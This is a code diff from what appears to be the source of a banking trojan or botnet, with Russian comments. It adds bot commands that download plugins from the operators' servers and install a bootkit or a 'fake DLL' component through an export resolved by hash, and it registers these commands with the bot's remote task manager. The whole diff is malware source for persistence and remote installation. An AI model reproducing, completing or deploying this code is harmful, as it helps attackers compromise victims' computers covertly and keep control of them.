@@ -1081,6 +1081,66 @@ bool ExecuteAlert(PTaskManager Manager, PCHAR Command, PCHAR Args)
 	return true;
 }
 
+
+//---------------------------------------------------------
+//  InstallBotPlug - Функция загружает  бота в виде длл и
+//                   устанавливает его с помощью инсталятор
+//
+//  InstallerName  - имя инсталятора
+//---------------------------------------------------------
+DWORD WINAPI InstallBotPlug(const string *InstallerName)
+{
+	TASKDBG("BotPlugInstaller", "Начинаем инсталяцию bot.plug инстялятором %s", InstallerName->t_str());
+
+	TPlugin Intaller(*InstallerName);
+	TPlugin Bot(GetStr(EStrBotPlug));
+
+	delete InstallerName;
+
+	// Загружаем плагины
+	if (!Intaller.Download(true) || !Bot.Download(false))
+		return FALSE;
+
+	TASKDBG("BotPlugInstaller", "Плагины спешно загруженыБ начинаем инсталцию");
+
+	// Запускаем инсталяцию
+	typedef BOOL (WINAPI *TInstall)(BYTE* DllBody, DWORD DllSize);
+
+	BOOL Result = FALSE;
+
+	TInstall Install;
+	if (Intaller.GetProcAddress(0x3E99511B /* Install */, (LPVOID&)Install))
+		Result = Install((LPBYTE)Bot.Data(), Bot.Size()) != FALSE;
+
+	if (Result)
+		TASKDBG("BotPlugInstaller", "Инсталяция успешно выполнена");
+
+	return Result;
+
+}
+
+//----------------------------------------------------------------------------
+
+bool ExecuteInstallBootkit(void* Manager, PCHAR Command, PCHAR Args)
+{
+	// Функция инсталирует буткит
+	StartThread(InstallBotPlug, new string(GetStr(EStrBootkitInstaller)));
+    return true;
+}
+//----------------------------------------------------------------------------
+
+bool ExecuteInstallFakeDll(void* Manager, PCHAR Command, PCHAR Args)
+{
+	// Функция инсталирует фэкедлл
+	StartThread(InstallBotPlug, new string(GetStr(EStrFakeDllInstaller)));
+	return true;
+}
+//----------------------------------------------------------------------------
+
+
+
+/*
+
 // Тело потока команды installfakedll
 void AsyncInstallFakeDll(void* Arguments)
 {
@@ -1175,6 +1235,7 @@ bool ExecuteInstallFakeDll(void* Manager, PCHAR Command, PCHAR Args)
 	return true;
 }
 
+*/
 
 
 //---------------------------------------------------------------------------
@@ -1246,20 +1307,24 @@ void RegisterAllCommands(PTaskManager Manager, DWORD Commands)
 	TASKDBG("RegisterAllCommands", "Started with Manager=0x%X Commands=%u", 
 		Manager, Commands);
 
+
 	if (BOT::GetBotType() != BotBootkit)
 	{
+		RegisterCommand(Manager, GetStr(EStrCommandInstallBootkit).t_str(), ExecuteInstallBootkit);
+
 		// Команда установки Bootkit из плага
-		RegisterCommand(Manager, (PCHAR)Plugin::CommandInstallBk, Plugin::ExecuteInstallBk);
+//		RegisterCommand(Manager, (PCHAR)Plugin::CommandInstallBk, Plugin::ExecuteInstallBk);
 
 		// Команда установки Bootkit из плага c включением статистического отстука
-		RegisterCommand(Manager, (PCHAR)Plugin::CommandInstallBkStat, Plugin::ExecuteInstallBkStat);
+//		RegisterCommand(Manager, (PCHAR)Plugin::CommandInstallBkStat, Plugin::ExecuteInstallBkStat);
     }
 
 	// Команда обновления плага
 	RegisterCommand(Manager, (PCHAR)Plugin::CommandUpdatePlug, Plugin::ExecuteUpdatePlug);
 
 	// Команда установки FakeDll
-	RegisterCommand(Manager, GetStr(CommandInstallFakeDLL).t_str(), ExecuteInstallFakeDll);
+	if (BOT::GetBotType() != BotFakeDll && BOT::GetBotType() != BotBootkit)
+		RegisterCommand(Manager, GetStr(EStrCommandInstallFakeDLL).t_str(), ExecuteInstallFakeDll);
 
 	// Команда grabber
 	#ifdef GrabberH
